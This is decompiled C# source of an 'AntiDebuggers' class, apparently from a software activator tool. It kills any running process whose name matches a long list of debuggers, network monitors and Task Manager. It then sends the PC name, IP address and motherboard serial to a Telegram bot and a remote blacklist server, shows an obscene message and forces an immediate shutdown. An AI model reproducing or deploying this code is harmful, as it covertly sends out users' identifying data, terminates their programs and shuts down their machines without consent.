using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace iAldazAllinOne
{
	// Token: 0x02000003 RID: 3
	internal sealed class AntiDebuggers
	{
		// Token: 0x06000003 RID: 3
		[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
		private static extern bool CheckRemoteDebuggerPresent(IntPtr ptr, ref bool b);

		// Token: 0x06000004 RID: 4 RVA: 0x00002CF8 File Offset: 0x00000EF8
		private string GetToolip()
		{
			string result;
			try
			{
				string requestUriString = "https://api.ipify.org/";
				HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
				httpWebRequest.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
				httpWebRequest.Timeout = -1;
				string text;
				using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
				{
					using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
					{
						text = streamReader.ReadToEnd();
					}
				}
				result = text;
			}
			catch
			{
				result = "ERROR";
			}
			return result;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002082 File Offset: 0x00000282
		internal void RegisteredWaitHandleAssemblyProductAttribute()
		{
			new Thread(new ParameterizedThreadStart(this.SizedArrayAssemblyCopyrightAttribute)).Start(Thread.CurrentThread);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x0000209F File Offset: 0x0000029F
		internal void RegisteredWaitHandleAssemblyProductAttribute2()
		{
			new Thread(new ParameterizedThreadStart(this.SizedArrayAssemblyCopyrightAttribute2)).Start(Thread.CurrentThread);
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002D94 File Offset: 0x00000F94
		public void report(string message)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("https://api.telegram.org/bot12345:rest/sendMessage?chat_id=-1001446038808&text=" + message);
			httpWebRequest.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
			httpWebRequest.Proxy = null;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using (Stream responseStream = httpWebResponse.GetResponseStream())
				{
					using (StreamReader streamReader = new StreamReader(responseStream))
					{
						streamReader.ReadToEnd();
					}
				}
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002E30 File Offset: 0x00001030
		internal void SizedArrayAssemblyCopyrightAttribute(object th)
		{
			string[] array = new string[]
			{
				"codecracker",
				"x32dbg",
				"x64dbg",
				"charles",
				"dnspy",
				"simpleassembly",
				"peek",
				"httpanalyzer",
				"wireshark",
				"devirt",
				"logger",
				"usbtrace",
				"usbmonitor",
				"serialmonitor",
				"ilspy",
				"charlesproxy",
				"fiddler",
				"extremedumper",
				"megadumper",
				"x64netdumper",
				"dumper",
				"dump",
				"ollydbg ",
				"softice",
				"dotpeek",
				"TEMP",
				"Taskmgr",
				"Taskmgr.exe",
				"cheat engine",
				"cheatengine",
				"scylla",
				"scylla_x64",
				"scylla_x86",
				"protection_id",
				"reshacker",
				"ImportREC",
				"de4dot",
				"disassembly",
				"Import reconstructor",
				"debug",
				"debugger",
				"httpdebug",
				"httpdebug",
				"immunitydebugger",
				"immunity",
				"debug",
				"petool",
				"petools",
				"PE Tools",
				"ida",
				"ida64",
				"idag",
				"idag64",
				"idaw",
				"idaw64",
				"idaq",
				"idaq64",
				"idau",
				"idau64",
				"idag",
				"idaq",
				"windbg",
				"[cpu",
				"simpleassembly",
				"postman",
				"softice",
				"jetbrains",
				"Resource Monitor",
				"Resource",
				"Resource and Performancer Monitor",
				"temp",
				"AppData",
				"Suspend Process",
				"processhacker",
				"Process Hacker",
				"perfmon",
				"valgrind",
				"SIMMON",
				"Rational Purify",
				"Memcheck",
				"Disassembler",
				"parasoft",
				"Dr. Memory",
				"WinHex",
				"Analyze It",
				"Hook Analyzer",
				"Process Explorer",
				"procmon64",
				"scylla",
				"de4dotmodded",
				"protection_id",
				"x96dbg",
				"process hacker",
				"process monitor",
				"qt5core",
				"dbgclr",
				"hxd",
				"import reconstructor",
				"Trw2000",
				"Winpdb",
				"procdump"
			};
			for (;;)
			{
				try
				{
					Process[] processes = Process.GetProcesses();
					foreach (Process process in processes)
					{
						if (process != Process.GetCurrentProcess())
						{
							for (int j = 0; j < array.Length; j++)
							{
								int id = Process.GetCurrentProcess().Id;
								if (process.ProcessName.ToLower().Contains(array[j]))
								{
									try
									{
										process.Kill();
										File.WriteAllText("WARNING.txt", string.Concat(new string[]
										{
											"WE FOUND: ",
											process.ProcessName,
											" RUNNING IN BACKGROUND! We close the ",
											process.ProcessName,
											" in Order to start using our tool\n\nPLEASE REOPEN THE TOOL"
										}));
										new Process
										{
											StartInfo = 
											{
												FileName = "notepad.exe",
												Arguments = "WARNING.TXT",
												UseShellExecute = false,
												RedirectStandardOutput = true,
												CreateNoWindow = true
											}
										}.Start();
										goto IL_549;
									}
									catch (Exception)
									{
										goto IL_549;
									}
									goto IL_488;
									IL_549:
									Process.GetCurrentProcess().Kill();
								}
								IL_488:
								if (process.MainWindowTitle.ToLower().Contains(array[j]))
								{
									try
									{
										process.Kill();
										File.WriteAllText("WARNING.txt", string.Concat(new string[]
										{
											"WE FOUND: ",
											process.ProcessName,
											" RUNNING IN BACKGROUND! We close the ",
											process.ProcessName,
											" in Order to start using our tool\n\nPLEASE REOPEN THE TOOL"
										}));
										new Process
										{
											StartInfo = 
											{
												FileName = "notepad.exe",
												Arguments = "WARNING.TXT",
												UseShellExecute = false,
												RedirectStandardOutput = true,
												CreateNoWindow = true
											}
										}.Start();
										goto IL_563;
									}
									catch (Exception)
									{
										goto IL_563;
									}
									goto IL_53E;
									IL_563:
									Process.GetCurrentProcess().Kill();
									Process.GetCurrentProcess().Kill();
								}
								IL_53E:;
							}
						}
					}
				}
				catch (Exception)
				{
				}
				Thread.Sleep(1000);
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00003418 File Offset: 0x00001618
		internal void SizedArrayAssemblyCopyrightAttribute2(object th)
		{
			AntiDebuggers.<>c__DisplayClass6_0 CS$<>8__locals1;
			CS$<>8__locals1.<>4__this = this;
			CS$<>8__locals1.array = new string[]
			{
				"codecracker",
				"x32dbg",
				"x64dbg",
				"charles",
				"dnspy",
				"simpleassembly",
				"peek",
				"httpanalyzer",
				"wireshark",
				"devirt",
				"logger",
				"usbtrace",
				"usbmonitor",
				"serialmonitor",
				"ilspy",
				"charlesproxy",
				"fiddler",
				"extremedumper",
				"megadumper",
				"x64netdumper",
				"dumper",
				"dump",
				"ollydbg ",
				"softice",
				"dotpeek",
				"TEMP",
				"Taskmgr",
				"cheat engine",
				"cheatengine",
				"scylla",
				"scylla_x64",
				"scylla_x86",
				"protection_id",
				"reshacker",
				"ImportREC",
				"de4dot",
				"disassembly",
				"Import reconstructor",
				"debug",
				"debugger",
				"httpdebug",
				"httpdebug",
				"immunitydebugger",
				"immunity",
				"debug",
				"petool",
				"petools",
				"PE Tools",
				"ida",
				"ida64",
				"idag",
				"idag64",
				"idaw",
				"idaw64",
				"idaq",
				"idaq64",
				"idau",
				"idau64",
				"idag",
				"idaq",
				"windbg",
				"[cpu",
				"simpleassembly",
				"postman",
				"softice",
				"jetbrains",
				"Resource Monitor",
				"Resource",
				"Resource and Performancer Monitor",
				"temp",
				"AppData",
				"Suspend Process",
				"processhacker",
				"Process Hacker",
				"perfmon",
				"valgrind",
				"SIMMON",
				"Rational Purify",
				"Memcheck",
				"Disassembler",
				"parasoft",
				"Dr. Memory",
				"WinHex",
				"Analyze It",
				"Hook Analyzer",
				"Process Explorer",
				"procmon64",
				"scylla",
				"de4dotmodded",
				"protection_id",
				"x96dbg",
				"process hacker",
				"process monitor",
				"qt5core",
				"dbgclr",
				"hxd",
				"import reconstructor",
				"Trw2000",
				"Winpdb",
				"procdump"
			};
			for (;;)
			{
				try
				{
					foreach (Process process in Process.GetProcesses())
					{
						if (process != Process.GetCurrentProcess())
						{
							for (int j = 0; j < CS$<>8__locals1.array.Length; j++)
							{
								int id = Process.GetCurrentProcess().Id;
								if (process.ProcessName.ToLower().Contains(CS$<>8__locals1.array[j]))
								{
									this.method_0(CS$<>8__locals1.array[j], ref CS$<>8__locals1);
									this.method_0(process.MainWindowTitle, ref CS$<>8__locals1);
								}
								if (process.MainWindowTitle.ToLower().Contains(CS$<>8__locals1.array[j]))
								{
									this.method_0(CS$<>8__locals1.array[j], ref CS$<>8__locals1);
									this.method_0(process.ProcessName, ref CS$<>8__locals1);
								}
							}
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000389C File Offset: 0x00001A9C
		public void OFF_PC()
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "shutdown /s /t 0");
			Process.Start("shutdown", "/s /t 0");
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			new Process
			{
				StartInfo = processStartInfo
			}.Start();
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000038FC File Offset: 0x00001AFC
		public static string ObtenerMotherBoardID()
		{
			string text = "MBID";
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_BaseBoard");
				ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text = (string)managementObject["SerialNumber"];
				}
			}
			catch (Exception arg)
			{
				Console.WriteLine("ERROR: ", arg);
				text = "2";
			}
			return text.Trim();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00003998 File Offset: 0x00001B98
		public string PCGOBLACKLIST()
		{
			string str = "http://ialdaz-activator.com/XPRO/Blacklist/blacklist.php";
			string requestUriString = str + "?PC=" + AntiDebuggers.ObtenerMotherBoardID();
			HttpWebRequest httpWebRequest = WebRequest.CreateHttp(requestUriString);
			httpWebRequest.AutomaticDecompression = (DecompressionMethods.GZip | DecompressionMethods.Deflate);
			httpWebRequest.Timeout = 12000;
			string result;
			using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
			{
				using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream()))
				{
					result = streamReader.ReadToEnd();
				}
			}
			return result;
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00003A30 File Offset: 0x00001C30
		[CompilerGenerated]
		private void method_0(string process, ref AntiDebuggers.<>c__DisplayClass6_0 <>c__DisplayClass6_0_0)
		{
			Process[] processesByName = Process.GetProcessesByName(process);
			if (processesByName.Length < 1)
			{
				return;
			}
			Process[] array = processesByName;
			for (int i = 0; i < <>c__DisplayClass6_0_0.array.Length; i++)
			{
				array[i].Kill();
				this.report(string.Concat(new string[]
				{
					"Trying To Crack Tool By: ",
					process,
					"\nPC Name : ",
					Environment.MachineName.ToString(),
					"\nDate: ",
					DateTime.Now.ToString("dddd, dd MMMM yyyy"),
					"\nIP:",
					this.GetToolip(),
					"\nSERIAL: ",
					AntiDebuggers.ObtenerMotherBoardID()
				}));
				if (process.StartsWith("megadump") || process.Contains("Megadumper") || process.Contains("Process hacker") || process.Contains("Processhacker") || process.Contains("codecracker") || process.StartsWith("reshack") || process.StartsWith("x96db") || process.StartsWith("petools") || process.StartsWith("dump") || process.StartsWith("x64netdump"))
				{
					this.PCGOBLACKLIST();
					this.report(string.Concat(new string[]
					{
						"New PC LIST BLACK\nReason: Used: ",
						process,
						"\nPC Name : ",
						Environment.MachineName.ToString(),
						"\nPC SERIAL: ",
						AntiDebuggers.ObtenerMotherBoardID(),
						"\nDate: ",
						DateTime.Now.ToString("dddd, dd MMMM yyyy"),
						"\nIP:",
						this.GetToolip()
					}));
					MessageBox.Show("jeje0x FUCKKKK YOU XD");
					this.OFF_PC();
				}
				if (process.StartsWith("ida6") || process.Contains("de4do") || process.Contains("SIMMON") || process.Contains("extremedump") || process.StartsWith("x32dbg") || process.StartsWith("x64dbg") || process.StartsWith("scylla") || process.StartsWith("THEMIDA_UNPACK_x86") || process.StartsWith("THEMIDA_UNPACK_x64") || process.StartsWith("Unpacker"))
				{
					this.PCGOBLACKLIST();
					this.report(string.Concat(new string[]
					{
						"New PC LIST BLACK\nReason: Used: ",
						process,
						"\nPC Name : ",
						Environment.MachineName.ToString(),
						"\nPC SERIAL: ",
						AntiDebuggers.ObtenerMotherBoardID(),
						"\nDate: ",
						DateTime.Now.ToString("dddd, dd MMMM yyyy"),
						"\nIP:",
						this.GetToolip()
					}));
					MessageBox.Show("jeje0x FUCKKKK YOU XD");
					this.OFF_PC();
				}
				if (process.StartsWith("dnsp") || process.Contains("DnsPy"))
				{
					this.PCGOBLACKLIST();
					this.report(string.Concat(new string[]
					{
						"New PC LIST BLACK\nReason: Used: ",
						process,
						"\nPC Name : ",
						Environment.MachineName.ToString(),
						"\nPC SERIAL: ",
						AntiDebuggers.ObtenerMotherBoardID(),
						"\nDate: ",
						DateTime.Now.ToString("dddd, dd MMMM yyyy"),
						"\nIP:",
						this.GetToolip()
					}));
					this.OFF_PC();
				}
			}
			if (process.StartsWith("verInfoLib") || process.Contains("de4dot-x64") || process.Contains("de4dot") || process.Contains("procdump") || process.StartsWith("x32-dbg") || process.StartsWith("x64-dbg") || process.StartsWith("ilspy") || process.StartsWith("fiddler") || process.StartsWith("THEMIDA_UNPACK_x64") || process.StartsWith("Unpacker"))
			{
				this.PCGOBLACKLIST();
				this.report(string.Concat(new string[]
				{
					"New PC LIST BLACK\nReason: Used: ",
					process,
					"\nPC Name : ",
					Environment.MachineName.ToString(),
					"\nPC SERIAL: ",
					AntiDebuggers.ObtenerMotherBoardID(),
					"\nDate: ",
					DateTime.Now.ToString("dddd, dd MMMM yyyy"),
					"\nIP:",
					this.GetToolip()
				}));
				MessageBox.Show("jeje0x FUCKKKK YOU XD");
				this.OFF_PC();
			}
		}
	}
}
